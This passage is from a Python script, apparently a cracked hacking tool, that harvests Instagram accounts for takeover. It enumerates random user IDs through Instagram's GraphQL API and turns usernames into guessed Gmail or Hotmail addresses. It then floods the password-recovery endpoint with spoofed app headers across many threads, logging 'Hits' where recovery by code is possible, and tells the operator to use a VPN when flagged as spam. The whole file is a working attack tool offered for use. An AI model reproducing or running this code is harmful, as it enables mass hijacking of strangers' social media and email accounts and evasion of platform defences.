      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
{F}Hits : {M}{ge}{Z} | Bad : {M}{bi}{X} |Bad : {M}{be}{C}'''),sys.stdout.flush()
        elif ('"spam":true')in re:
            os.system('cls'if os.name=='nt'else'clear')
            print("Warning ! Run Vpn  ")
        else:
            bi+=1
            sys.stdout.write(f'''\r{a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
{F}Hits : {M}{ge}{Z} | Bad : {M}{bi}{X} |Bad : {M}{be}{C}'''),sys.stdout.flush()              
    except Exception as e:""
               
def insta(email):
    global ge,be,gi,bi
    headers = {
        'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
        'X-Pigeon-Rawclienttime':'1707104597.347',
        'X-IG-Connection-Speed':'-1kbps',
        'X-IG-Bandwidth-Speed-KBPS':'-1.000',
        'X-IG-Bandwidth-TotalBytes-B':'0',
        'X-IG-Bandwidth-TotalTime-MS':'0',
        'X-IG-VP9-Capable':'false',
        'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type':'WIFI',
        'X-IG-Capabilities':'3brTvw==',
        'X-IG-App-ID':'567067343352427',
        'User-Agent':str(generate_user_agent()),
        'Accept-Language':'ar-IQ, en-US',
        'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Host':'i.instagram.com',
        'X-FB-HTTP-Engine':'Liger',
        'Connection':'keep-alive',
        'Content-Length':'364',
    }
    data = {
        'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

        'ig_sig_key_version':'4',
    }	
    try:
        re = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
    

        if ('"can_recover_with_code"')in re:
            gmail(email)
            gi+=1
            sys.stdout.write(f'''\r{a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
{F}Hits : {M}{ge}{Z} | Bad : {M}{bi}{X} |Bad : {M}{be}{C}'''),sys.stdout.flush()
        elif ('"spam":true')in re:
           os.system('cls'if os.name=='nt'else'clear')
           print("Warning ! Run Vpn  ")
           #block(email)
        else:
            bi+=1
            sys.stdout.write(f'''\r{a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n
{F}Hits : {M}{ge}{Z} | Bad : {M}{bi}{X} |Bad : {M}{be}{C}'''),sys.stdout.flush()
    except Exception as e:''
def admin_gm(name):
    try:
         file = open(name,'r').read().splitlines()
    except:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("السته غير موجوده  ! "	)
    with ThreadPoolExecutor(max_workers=15)as executor:
        futures=[executor.submit(insta,user+"@gmail.com")for user in file]
        for future in futures:
            future.result()
def admin_hot(name):
    try:
         file = open(name,'r').read().splitlines()
    except:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("السته غير موجوده  ! "	)
    with ThreadPoolExecutor(max_workers=15)as executor:
        futures=[executor.submit(insta2,user+"@hotmail.com")for user in file]
        for future in futures:
            future.result()
def gm_2011():
    bbk = 10000
    id = 17699999
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@gmail.com"
         insta(email)
        except:pass
def gm_2012():
    bbk = 17699999
    id = 263014407
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@gmail.com"
         insta(email)
        except:pass
def gm_2014_2024():
    bbk = 361365133
    id = 21254029834
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }
        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@gmail.com"
         insta(email)
        except:pass
def gm_2013():
    bbk = 263014407
    id = 361365133
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@gmail.com"
         insta(email)
        except:""
def hot_2011():
    bbk = 10000
    id = 17699999
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@hotmail.com"
         insta2(email)
        except:pass
def hot_2012():
    bbk = 17699999
    id = 263014407
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@hotmail.com"
         insta2(email)
        except:pass
def hot_2014_2024():
    bbk = 361365133
    id = 21254029834
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }
        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@hotmail.com"
         insta2(email)
        except:pass
def hot_2013():
    bbk = 263014407
    id = 361365133
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
        )
        except:pass
        try:
         username = response.json().get('data', {}).get('user', {}).get('username')
         email=username+"@hotmail.com"
         insta2(email)
        except:pass
def aras():

   hh= f"""
 {a12}
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝═╝
               Ｄｅｖ : @W4_M4 / @pytho2n
               • تم فك من اراس  @W4_M4
• قناه المفكك @pytho2n

{X}1 - {a9}Check List Gmail
{X}2 - {a9}Check List Hotmail
{X}3 - {a9}Gmail 2011
{X}4 - {a9}Gmail 2012
{X}5 - {a9}Gmail 2013
{X}6 - {a9}Hotmail 2011
{X}7 - {a9}Hotmail 2012
{X}8 - {a9}Hotmail 2013
{X}9 - {a9}Random Gmail
{X}10 - {a9}Random Hotmail
{X}00 - {a10}Exit
    """
   print(hh)
   try:
       i = int(input(f'{S}Choose What You Want : '))
       if i ==1:
          name=input("Enter File Name :")
          os.system('cls'if os.name=='nt'else'clear')
          admin_gm(name)
       elif i==2:
          name=input("Enter File Name :")
          os.system('cls'if os.name=='nt'else'clear')
          admin_hot(name)
       elif i==3:
          os.system('cls'if os.name=='nt'else'clear')
          from threading import Thread
          for _ in range(25):
             Thread(target=gm_2011).start()
       elif i==4:
          os.system('cls'if os.name=='nt'else'clear')
          from threading import Thread
          for _ in range(25):
             Thread(target=gm_2012).start()
       elif i==5:
          os.system('cls'if os.name=='nt'else'clear')
          from threading import Thread
          for _ in range(25):
             Thread(target=gm_2013).start()
       elif i==6:
          os.system('cls'if os.name=='nt'else'clear')
          from threading import Thread
          for _ in range(25):
             Thread(target=hot_2011).start()
       elif i==7:
          os.system('cls'if os.name=='nt'else'clear')
          from threading import Thread
          for _ in range(25):
             Thread(target=hot_2012).start()
       elif i==8:
          os.system('cls'if os.name=='nt'else'clear')
          from threading import Thread
          for _ in range(25):
             Thread(target=hot_2013).start()
       elif i==9:
          os.system('cls'if os.name=='nt'else'clear')
          from threading import Thread
          for _ in range(25):
             Thread(target=gm_2014_2024).start()
       elif i==10:
          os.system('cls'if os.name=='nt'else'clear')
          from threading import Thread
          for _ in range(25):
             Thread(target=hot_2014_2024).start()
       elif i==00:
          os.system('cls'if os.name=='nt'else'clear')
          print(f"{M}Exiting...{X}")
       else:
          print("Error Input *")
   except Exception as e:
      print("Error Input *")

aras()

